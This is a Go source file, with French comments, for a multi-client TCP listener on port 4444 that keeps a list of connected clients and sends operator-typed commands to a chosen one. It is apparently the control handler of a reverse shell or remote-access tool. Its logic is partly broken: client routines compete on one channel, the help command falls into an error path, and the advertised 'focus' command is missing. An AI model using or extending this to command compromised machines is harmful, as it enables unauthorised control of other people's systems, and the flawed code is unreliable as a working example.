package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
)

var emojiMap = map[string]string{
	"listenning": "📡 ",
	"info":       "ℹ️ ",
	"connection": "🎯 ",
	"closed":     "🚪 ",
	"not ok":     "❌ ",
	"ok":         "✔️ ",
	"setting":    "⚙️ ",
	"debug":      "🛠️ ",
	"task":       "🎯 ",
	"alert":      "🔔 ",
	"loading":    "⏳ ",
	"send":       "🚀 ",
	"user":       "🤖 ",
	"error":      "❗ ",
	"help":       "💡 ",
}

// Fonction pour récupérer l'emoji associé à une clé donnée
func getEmoji(key string) string {
	if emoji, ok := emojiMap[key]; ok {
		return emoji
	}
	return "ℹ️" // Emoji par défaut si la clé n'existe pas
}

type Client struct {
	ID      int
	Address string
	Conn    net.Conn
}

var clients = make(map[int]Client)
var clientCounter int
var mutex sync.Mutex
var commandChannel = make(chan string) // Channel pour transmettre les commandes

func main() {
	server, err := net.Listen("tcp", ":4444")
	if err != nil {
		panic(err)
	}
	defer server.Close()
	fmt.Println(getEmoji("listenning") + "Listening on :4444")

	go handleCommands() // Une seule goroutine pour lire les commandes du terminal

	for {
		conn, err := server.Accept()
		if err != nil {
			fmt.Println(getEmoji("error")+"Error accepting connection:", err)
			continue
		}

		// Générer un nouvel ID pour chaque client
		mutex.Lock()
		clientCounter++
		clientID := clientCounter
		mutex.Unlock()

		// Ajouter le client à la map
		client := Client{
			ID:      clientID,
			Address: conn.RemoteAddr().String(),
			Conn:    conn,
		}
		mutex.Lock()
		clients[clientID] = client
		mutex.Unlock()

		fmt.Printf(getEmoji("connection")+"New connection from %s\n", conn.RemoteAddr().String())
		go processCli(conn, clientID) // Démarre une goroutine pour chaque client
	}
}

// Cette fonction gère la lecture des commandes et la transmission via un channel
func handleCommands() {
	scanner := bufio.NewScanner(os.Stdin)
	for {
		// Afficher l'emoji d'invite avant chaque saisie utilisateur

		if scanner.Scan() {
			command := scanner.Text()

			// Ignorer les commandes vides
			if strings.TrimSpace(command) == "" {
				continue
			}

			// Envoyer la commande dans le channel
			commandChannel <- command
		}
	}
}

func processCli(connection net.Conn, clientID int) {
	defer connection.Close()

	for {
		command := <-commandChannel

		if command == "list" {
			listClients()
			continue
		}
		if command == "help" {
			fmt.Println(getEmoji("help") + "Sure! Here's available commands:")
			fmt.Println("    help: display this message")
			fmt.Println("    list: display connected clients")
			fmt.Println("    focus <client_id>: focusing on one client")
			fmt.Println("    defocus: de-focusing from current client")

		}

		parts := strings.SplitN(command, " ", 2)

		if len(parts) < 2 {
			fmt.Println(getEmoji("not ok") + "Invalid command format. Use: <client_id> <command>")
			continue
		}

		clientIDStr := parts[0]
		cmd := parts[1]
		//fmt.Println("CLIENT ID STR: " + clientIDStr)
		// Convertir l'ID en entier
		clientID, err := strconv.Atoi(clientIDStr)
		if err != nil {
			fmt.Println(getEmoji("not ok") + "ID de client invalide")
			continue
		}

		mutex.Lock()
		client, ok := clients[clientID]
		mutex.Unlock()
		if ok {
			sendCommand(client.Conn, cmd)
		} else {
			fmt.Printf(getEmoji("not ok")+"Client avec ID %d non trouvé\n", clientID)
		}
	}
}

func sendCommand(conn net.Conn, command string) {
	_, err := conn.Write([]byte(command + "\n"))
	if err != nil {
		fmt.Printf(getEmoji("error")+"Erreur lors de l'envoi de la commande : %v\n", err)
	}
}

func listClients() {
	mutex.Lock()
	defer mutex.Unlock()

	if len(clients) == 0 {
		fmt.Println(getEmoji("not ok") + "No clients connected")
		return
	}

	for id, client := range clients {
		fmt.Printf(getEmoji("user")+"ID: %d ADDR: %s\n", id, client.Address)
	}
}
